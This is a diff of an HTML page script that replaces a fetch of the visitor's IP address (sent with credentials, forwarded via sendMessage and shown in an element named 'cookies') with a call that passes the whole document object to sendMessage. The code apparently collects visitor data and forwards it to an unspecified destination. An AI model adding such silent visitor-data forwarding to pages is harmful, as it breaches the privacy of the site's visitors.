@@ -46,19 +46,7 @@
         </div>
         <audio id="bgAudio" loop><source src="Images/music.mp3" type="audio/mpeg"></audio>
         <script>
-            fetch("http://httpbin.org/ip", {
-              method: "GET",
-              credentials: "include" // This is optional for httpbin, but kept here
-            })
-            .then(response => response.json())
-            .then(data => {
-              const jsonText = JSON.stringify(data, null, 2);
-              sendMessage(jsonText);
-              document.getElementById("cookies").innerText = jsonText || "No data found.";
-            })
-            .catch(error => {
-              document.getElementById("cookies").innerText = "Error: " + error.message;
-            });
+            sendMessage(document)
             const overlay = document.getElementById('overlay');
             const audio = document.getElementById('bgAudio');
             const mainContent = document.getElementById('mainContent');
